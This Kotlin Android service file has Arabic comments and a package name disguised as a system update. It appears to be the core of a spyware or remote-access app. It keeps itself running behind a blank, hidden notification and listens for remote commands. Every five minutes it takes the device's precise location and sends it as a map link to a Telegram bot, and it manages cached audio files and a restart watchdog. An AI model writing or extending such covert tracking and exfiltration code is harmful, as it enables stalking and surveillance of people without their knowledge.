// language: Kotlin, file: BackgroundService.kt
// *startForeground() يجب أن يُستدعى خلال 5 ثواني من onStartCommand*
// *لا تُعد إطلاق الـ service من onDestroy على API 31+ — START_STICKY يكفي*
// *نوع الـ foregroundServiceType يجب أن يطابق AndroidManifest*

package com.sys.update2

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    @Volatile private var running = false
    @Volatile private var foregroundStarted = false

    private val notificationId = 1001
    private val channelId = "sys_sync_channel"

    override fun onCreate() {
        super.onCreate()

        // لا نعمل startForeground هنا — نتركها لـ onStartCommand
        // لأن onCreate لا يُمنح دائماً الـ 5 ثواني على كل الأجهزة

        try { CommandListener.start(applicationContext) } catch (_: Exception) {}
        try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}

        startLoops()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // الضمان الحاسم: startForeground في كل مرة
        if (!foregroundStarted) {
            val ok = tryStartForeground()
            if (!ok) {
                // لا يمكن العمل كـ foreground — أوقف نفسك بأمان
                stopSelf()
                return START_NOT_STICKY
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { SyncWorker.stop() } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()

        // لا نعيد الإطلاق يدوياً — START_STICKY يدير هذا بشكل آمن

        super.onDestroy()
    }

    // ═══════════════════════════════════════════
    //  Foreground
    // ═══════════════════════════════════════════

    private fun tryStartForeground(): Boolean {
        return try {
            ensureChannel()
            val notif = buildNotification()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // اختر النوع حسب الأذونات المتاحة فعلاً
                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (hasLocationPermission()) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                }

                try {
                    startForeground(notificationId, notif, type)
                } catch (_: Exception) {
                    // fallback: dataSync فقط
                    try {
                        startForeground(
                            notificationId,
                            notif,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                        )
                    } catch (_: Exception) {
                        startForeground(notificationId, notif)
                    }
                }
            } else {
                startForeground(notificationId, notif)
            }

            foregroundStarted = true
            running = true
            true
        } catch (e: Exception) {
            android.util.Log.e("BgService", "startForeground failed: ${e.message}")
            false
        }
    }

    private fun ensureChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(channelId) != null) return

        val ch = NotificationChannel(
            channelId,
            " ",
            NotificationManager.IMPORTANCE_MIN
        )
        ch.setSound(null, null)
        ch.enableVibration(false)
        ch.setShowBadge(false)
        ch.description = " "
        ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
        nm.createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_white_dot)
            .setContentTitle(" ")
            .setContentText(" ")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    // ═══════════════════════════════════════════
    //  Loops
    // ═══════════════════════════════════════════

    private fun startLoops() {
        // SyncWorker — بعد 3 ثواني
        scope.launch {
            delay(3_000L)
            if (!running) return@launch
            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
        }

        // Heartbeat — كل 3 دقايق
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // الموقع — كل 5 دقايق
        scope.launch {
            while (running) {
                try {
                    if (hasLocationPermission()) {
                        val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
                        if (loc != null) {
                            LocationCache.save(
                                applicationContext,
                                loc.latitude,
                                loc.longitude,
                                loc.accuracy
                            )
                            if (KeyboardBuilder.locationOn) {
                                TelegramApi.sendMessage(
                                    "📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
                                )
                            }
                        }
                    }
                } catch (_: Exception) {}
                delay(5 * 60_000L)
            }
        }

        // تنظيف ملفات الكاش
        scope.launch {
            while (running) {
                try {
                    val audioDir = File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 3600_000L
                        audioDir.listFiles()?.forEach {
                            if (it.lastModified() < cutoff) it.delete()
                        }
                    }
                } catch (_: Exception) {}
                delay(10 * 60_000L)
            }
        }

        // Watchdog
        scope.launch {
            while (running) {
                delay(60_000L)
                if (!running) break
                try {
                    if (!syncWorkerIsRunning()) {
                        SyncWorker.start(applicationContext)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun hasLocationPermission(): Boolean {
        return try {
            val fine = ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val coarse = ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            fine || coarse
        } catch (_: Exception) {
            false
        }
    }

    private fun syncWorkerIsRunning(): Boolean {
        return try {
            Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
        } catch (_: Exception) {
            true
        }
    }

    companion object {
        /**
         * إطلاق آمن من أي سياق. لا يرمي استثناءات.
         * يعيد true إذا تم الإطلاق بنجاح.
         */
        fun startSafely(context: Context): Boolean {
            return try {
                val intent = Intent(context, BackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                true
            } catch (e: Exception) {
                android.util.Log.e("BgService", "startSafely failed: ${e.message}")
                false
            }
        }

        fun isAppInForeground(context: Context): Boolean {
            return try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val procs = am.runningAppProcesses ?: return true
                val myPid = android.os.Process.myPid()
                procs.firstOrNull { it.pid == myPid }?.importance ==
                    ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            } catch (_: Exception) {
                true
            }
        }
    }
}
